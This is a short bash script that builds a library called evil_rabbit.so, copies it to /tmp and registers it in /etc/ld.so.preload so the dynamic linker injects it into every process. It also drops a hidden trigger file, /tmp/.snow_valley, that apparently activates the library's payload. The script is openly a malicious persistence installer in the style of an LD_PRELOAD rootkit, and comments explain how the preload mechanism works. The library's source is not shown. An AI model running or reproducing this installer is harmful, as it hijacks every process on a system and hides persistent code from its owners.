#!/bin/bash

make clean
make
cp ./evil_rabbit.so /tmp/evil_rabbit.so

# Register itself into "ld.so.preload" which is consulted by the dynamic linker to load all the 
# listed SO(s) into the process address space of the calling process before the dynamic linker loads 
# any dependency SO of the user space program.
echo /tmp/evil_rabbit.so > /etc/ld.so.preload

# For "evil_rabbit.so" to trigger peace(), it should find the "snow_valley"
echo "Eternity is a myth" > /tmp/.snow_valley
